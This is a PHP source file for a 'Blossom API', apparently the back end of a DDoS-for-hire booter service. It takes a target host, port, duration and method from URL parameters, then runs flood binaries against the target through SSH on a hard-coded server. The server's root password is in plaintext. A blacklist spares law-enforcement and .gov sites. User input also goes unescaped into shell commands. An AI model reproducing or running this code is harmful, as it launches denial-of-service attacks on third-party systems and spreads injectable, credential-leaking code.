<title>Blossom API - API System Made By @tcp.sh</title>
</body>
<?php

require 'list.php';
error_reporting(E_ALL); 
    $APIKeys = array("tcpsh101", "root101"); //api keys
    $all = array("HOME", "STD", 'STOP');
    $blacklisted = array("1.1.1.1", "2.2.2.2", "3.3.3.3", "https://www.fbi.gov/", "https://www.fbi.gov", "fbi.gov", "http://www.fbi.gov/", "http://www.fbi.gov", "www.fbi.gov", "https://www.ic3.gov/", "www.ic3.gov", "52.227.97.93", "104.16.149.244", "4.4.4.4", "5.5.5.5", "6.6.6.6", "7.7.7.7", "8.8.8.8", "104.16.148.244", "23.22.13.113", "172.67.71.68", "23.206.40.120", "216.58.198.206", "45.134.8.1753", "185.13.36.249", "54.38.41.65", "142.44.166.226", "117.27.239.0", "103.95.221.0", "101.71.138.0", "103.95.221.5", "103.95.221.83", "103.95.221.2", "103.95.221.84", "117.27.239.28", "117.27.239.155", "117.27.239.209", "117.27.239.200", "117.27.239.154", "73.37.37.1", "79.133.124.237", "45.134.8.160");

        $key = ($_GET["key"]);
        $test = ($_GET["method"]);
        $black = ($_GET["host"]);
    
          if ($time > 300){
      die('MAX time Reached');}
      
    if (!in_array($key, $APIKeys)) die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:API Key Invalid</strong></code></body>');
    if (!in_array($test, $all)) die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Invalid Method</strong></code></body>');
    
if (!function_exists('ssh2_connect'))
{
        die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Could Not Connect</strong></code></body>');
}
if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {


        $SERVERS = array(
                "103.241.65.129"       =>      array("root", "PleaseComeHelpMe1")
                );

        class ssh2 {
                var $connection;
                function __construct($ip, $user, $pass) {
                        if (!$this->connection = ssh2_connect($ip, 22))
                                throw new Exception('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Connecting To Servers</strong></code></body>');
                        if (!ssh2_auth_password($this->connection, $user, $pass))
                                throw new Exception('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Wrong Server Info</strong></code></body>');
                }

                function exec($cmd) {
                        if (!ssh2_exec($this->connection, $cmd))
                                throw new Exception("Error executing command: $cmd");

                        ssh2_exec($this->connection, 'exit');
                        unset($this->connection);
                }
        }
        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;
        $port = preg_replace('/\D/', '', $port);
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*120) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
        $domain = $_GET['host'];
        $method = $_GET['method'];
                  if ($time > 7200){
                  
                      if(endFunc($ip,".gov")) // .GOV
  die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Host Is Blacklisted</strong></code></body>');
if(endFunc($ip,".ca")) // .CA
  die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Host Is Blacklisted</strong></code></body>'); 
if(endFunc($ip,".edu")) // .EDU
  die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Host Is Blacklisted</strong></code></body>'); 

      die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:MAX Time Reached</strong></code></body>');}

      if (in_array($ip, $blacklisted))
    {
     die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Host Is Blacklisted</strong></code></body>');
    }
        $smIP = str_replace(".", "", $ip);
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);
if ($_GET['method'] == "LDAP") { $command = "screen -dmS $ip ./TCP-FRAG $ip $port $time"; }
elseif ($_GET['method'] == "STD") { $command = "screen -dmS $ip ./STD $ip $port $time "; }
elseif ($_GET['method'] == "HOME") { $command = "./HOME $ip $port $time "; }
elseif ($_GET['method'] == "STOP") { $command = "screen -XS $ip quit "; }
        else die();
        echo("<p>
      <body style=background-color:#000000;>
      <strong style=color:#05f515;><center>ATTACK SENT WITH Blossom API</center></strong></code></body></p>
      </p><body><code> <strong style=color:white><center> Host:</strong> <strong style=color:#05f515;>$ip</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Port:</strong> <strong style=color:#05f515;>$port</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Time:</strong> <strong style=color:#05f515;>$time</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Method:</strong> <strong style=color:#05f515;>$method</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Servers:</strong> <strong style=color:#05f515;>1</center></strong></code></body>"); 
      
$key = ($_GET["key"]);
  shell_exec("python3 /var/www/html/api/webhook.py $key $ip $port $time $method");
      


        foreach ($SERVERS as $server=>$credentials) {
                $disposable = new ssh2($server, $credentials[0], $credentials[1]);
                $disposable->exec($command);


      
}
}
?>